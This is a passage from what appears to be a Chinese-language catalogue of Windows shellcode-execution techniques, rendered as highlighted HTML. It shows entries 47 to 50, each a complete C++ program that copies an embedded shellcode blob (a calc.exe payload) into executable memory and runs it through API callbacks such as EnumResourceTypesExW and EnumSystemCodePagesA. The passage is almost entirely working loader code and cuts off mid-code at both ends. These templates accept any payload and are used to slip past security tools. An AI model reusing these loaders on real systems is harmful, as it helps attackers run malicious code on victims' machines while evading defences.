hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumPwrSchemes((PWRSCHEMESENUMPROC)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>}<br></code></pre>
<h1 id="h47enumresourcetypesexw"><span>47.回调函数注入 通过 EnumResourceTypesExW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;ktmw32.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wchar.h&gt;</span></span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"KtmW32.lib"</span>)</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumResourceTypesExW(::LoadLibraryW(<span class="hljs-string">L"Kernel32.dll"</span>),&nbsp;(ENUMRESTYPEPROCW)address,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;RESOURCE_ENUM_VALIDATE,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>}<br></code></pre>
<h1 id="h48enumresourcetypesw"><span>48.回调函数注入 通过 EnumResourceTypesW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">const</span>&nbsp;<span class="hljs-keyword">char</span>*&nbsp;errmsg)</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error:&nbsp;%s&nbsp;(%u)\n"</span>,&nbsp;errmsg,&nbsp;::GetLastError());<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span>}<br><span class="linenum hljs-number">13</span><br><span class="linenum hljs-number">14</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">15</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">30</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">31</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">32</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">33</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">34</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumResourceTypesW(::LoadLibraryW(<span class="hljs-string">L"Kernel32.dll"</span>),&nbsp;(ENUMRESTYPEPROCW)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>}<br></code></pre>
<h1 id="h49enumsystemcodepagesa"><span>49.回调函数注入 通过 EnumSystemCodePagesA</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)hAlloc&nbsp;,<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>}<br></code></pre>
<h1 id="h50enumsystemcodepagesw"><span>50.回调函数注入 通过 EnumSystemCodePagesW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number">  1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number">  2</span><br><span class="linenum hljs-number">  3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number">  4</span><br><span class="linenum hljs-number">  5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number">  6</span><br><span class="linenum hljs-number">  7</span><span class="hljs-keyword">using</span>&nbsp;<span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-built_in">std</span>;<br><span class="linenum hljs-number">  8</span><br><span class="linenum hljs-number">  9</span><br><span class="linenum hljs-number"> 10</span><br><span class="linenum hljs-number"> 11</span><span class="hljs-comment">//&nbsp;Create&nbsp;a&nbsp;string&nbsp;with&nbsp;last&nbsp;error&nbsp;message</span><br><span class="linenum hljs-number"> 12</span><br><span class="linenum hljs-number"> 13</span><span class="hljs-built_in">std</span>::<span class="hljs-function"><span class="hljs-built_in">string</span>&nbsp;<span class="hljs-title">GetLastErrorStdStr</span><span class="hljs-params">()</span><br><span class="linenum hljs-number"> 14</span><br><span class="linenum hljs-number"> 15</span></span>{<br><span class="linenum hljs-number"> 16</span><br><span class="linenum hljs-number"> 17</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;error&nbsp;=&nbsp;GetLastError();<br><span class="linenum hljs-number"> 18</span><br><span class="linenum hljs-number"> 19</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(error)<br><span class="linenum hljs-number"> 20</span><br><span class="linenum hljs-number"> 21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 22</span><br><span class="linenum hljs-number"> 23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;lpMsgBuf;<br><span class="linenum hljs-number"> 24</span><br><span class="linenum hljs-number"> 25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;bufLen&nbsp;=&nbsp;FormatMessage(<br><span class="linenum hljs-number"> 26</span><br><span class="linenum hljs-number"> 27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FORMAT_MESSAGE_ALLOCATE_BUFFER&nbsp;|<br><span class="linenum hljs-number"> 28</span><br><span class="linenum hljs-number"> 29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FORMAT_MESSAGE_FROM_SYSTEM&nbsp;|<br><span class="linenum hljs-number"> 30</span><br><span class="linenum hljs-number"> 31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FORMAT_MESSAGE_IGNORE_INSERTS,<br><span class="linenum hljs-number"> 32</span><br><span class="linenum hljs-number"> 33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>,<br><span class="linenum hljs-number"> 34</span><br><span class="linenum hljs-number"> 35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error,<br><span class="linenum hljs-number"> 36</span><br><span class="linenum hljs-number"> 37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MAKELANGID(LANG_NEUTRAL,&nbsp;SUBLANG_DEFAULT),<br><span class="linenum hljs-number"> 38</span><br><span class="linenum hljs-number"> 39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LPTSTR)&amp;lpMsgBuf,<br><span class="linenum hljs-number"> 40</span><br><span class="linenum hljs-number"> 41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number"> 42</span><br><span class="linenum hljs-number"> 43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(bufLen)<br><span class="linenum hljs-number"> 44</span><br><span class="linenum hljs-number"> 45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number"> 46</span><br><span class="linenum hljs-number"> 47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpMsgStr&nbsp;=&nbsp;(LPCSTR)lpMsgBuf;<br><span class="linenum hljs-number"> 48</span><br><span class="linenum hljs-number"> 49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">std</span>::<span class="hljs-function"><span class="hljs-built_in">string</span>&nbsp;<span class="hljs-title">result</span><span class="hljs-params">(lpMsgStr,&nbsp;lpMsgStr&nbsp;+&nbsp;bufLen)</span></span>;<br><span class="linenum hljs-number"> 50</span><br><span class="linenum hljs-number"> 51</span><br><span class="linenum hljs-number"> 52</span><br><span class="linenum hljs-number"> 53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocalFree(lpMsgBuf);<br><span class="linenum hljs-number"> 54</span><br><span class="linenum hljs-number"> 55</span><br><span class="linenum hljs-number"> 56</span><br><span class="linenum hljs-number"> 57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;result;<br><span class="linenum hljs-number"> 58</span><br><span class="linenum hljs-number"> 59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 60</span><br><span class="linenum hljs-number"> 61</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number"> 62</span><br><span class="linenum hljs-number"> 63</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>();<br><span class="linenum hljs-number"> 64</span><br><span class="linenum hljs-number"> 65</span>}<br><span class="linenum hljs-number"> 66</span><br><span class="linenum hljs-number"> 67</span><br><span class="linenum hljs-number"> 68</span><br><span class="linenum hljs-number"> 69</span><br><span class="linenum hljs-number"> 70</span><br><span class="linenum hljs-number"> 71</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number"> 72</span><br><span class="linenum hljs-number"> 73</span></span>{<br><span class="linenum hljs-number"> 74</span><br><span class="linenum hljs-number"> 75</span><br><span class="linenum hljs-number"> 76</span><br><span class="linenum hljs-number"> 77</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span 